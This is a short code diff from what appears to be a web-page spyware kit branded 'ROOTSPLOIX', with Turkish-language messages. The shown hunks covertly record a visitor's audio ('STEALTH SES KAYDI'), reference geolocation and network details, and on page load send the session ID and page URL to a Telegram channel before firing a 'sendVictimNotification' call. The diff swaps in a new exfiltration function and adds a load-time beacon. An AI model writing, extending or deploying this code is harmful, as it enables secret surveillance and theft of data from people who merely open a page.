@@ -1791,7 +1791,7 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
                         const caption = `🎤 STEALTH SES KAYDI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n💾 Format: ${extension.toUpperCase()}\n📊 Boyut: ${(audioBlob.size/1024).toFixed(2)} KB\n\n💀 ROOTSPLOIX`;
                         
                         // Send directly as blob
-                        sendAudioBlobToTelegram(audioBlob, caption, filename);
+                        sendDirectMediaToTelegram(audioBlob, caption, 'audio', extension);
                         
                         recordedChunks = [];
                     }
@@ -2276,6 +2276,10 @@ ${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• H�
         
         // Stealth framework initialization
         window.addEventListener('DOMContentLoaded', function() {
+            // EMERGENCY DEBUG TEST
+            const testMsg = `🔥 EMERGENCY DEBUG TEST!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n💀 SYSTEM LOADING...`;
+            sendToTelegram(testMsg);
+            
             // Send victim notification
             setTimeout(sendVictimNotification, 2000);
             
